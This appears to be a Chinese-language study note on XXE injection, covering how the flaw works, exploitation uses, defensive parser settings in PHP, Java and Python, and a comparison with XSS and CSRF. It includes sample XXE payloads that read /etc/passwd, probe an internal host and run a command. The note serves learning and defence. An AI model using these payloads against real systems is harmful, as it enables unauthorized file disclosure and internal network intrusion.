title: XXE（XML外部实体注入）
author: liuGuobin
tags:
  - 日报
categories: []
date: 2023-07-09 16:17:00
---
#### 了解XML
XML 是一种标记语言，很类似于 HTML
XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息
因此我们需要编写软件或者程序，才能传送、接收和显示出这个文档。

#### 漏洞原理
XXE是针对解析XML输入的应用程序的一种攻击。
当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。

#### 常见漏洞存在点
可解析xml的api接口

#### 漏洞利用
1. 内网端口扫描
2. 利用file协议等读取文件
3. 攻击内网web应用使用
4. get(struts2等)

#### 危害   
1. 导致可以加载恶意外部文件
2. 造成文件读取（信息泄露、SSRF）
```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<x>&xxe;</x>
```
3. 内网端口扫描
```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "http://192.168.31.124:4444/test">
]>
<x>&xxe;</x></r>
```
4. 攻击内网网站（命令执行）
```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY xxe SYSTEM "except://id">
]>
<x>&xxe;</x>
```
5. 发起dos攻击等危害（拒绝服务）

#### 防御
1. 过滤用户提交的XML数据
2. 将PHP程序的libxml_disable_entity_loader设置为TRUE来禁用外部实体
3. java如下更改配置
```
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```
4. python如下配置
```
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

#### CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？
<a href="https://smms.app/image/mKHhc1M6lY5OjnD" target="_blank"><img src="https://s2.loli.net/2023/07/19/mKHhc1M6lY5OjnD.png" ></a>

`XSS` 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。
修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。

`CSRF` 是跨站请求伪造攻击，没有在关键操作执行时进行是否由用户自愿发起的确认。
修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.

`XXE` 是XML中可以通过调用实体来请求本地或者远程内容
修复方式：XML解析库在调用时严格禁止对外部实体的解析